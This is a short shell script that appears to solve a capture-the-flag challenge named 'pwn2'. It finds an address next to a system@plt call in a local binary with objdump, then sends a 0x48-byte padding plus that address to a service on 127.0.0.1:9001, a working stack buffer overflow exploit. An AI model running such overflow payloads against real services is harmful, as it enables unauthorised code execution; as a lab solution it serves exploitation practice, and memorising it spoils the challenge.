#!/bin/sh
if [ ! -f main ]; then
	echo "main is missing, unpack archive first"
	echo "tar xf ../pwn2.tar.gz main"
	exit 1
fi

addr=$(objdump -d 'main' \
	| fgrep 'system@plt' -B 1 \
	| fgrep 'lea' \
	| grep -Po '[0-9a-f]+(?=:)'
)

value="$(( 0x$addr ))"
perl -e "print('A' x 0x48); print(pack('Q', ${value}))" | ncat 127.0.0.1 9001
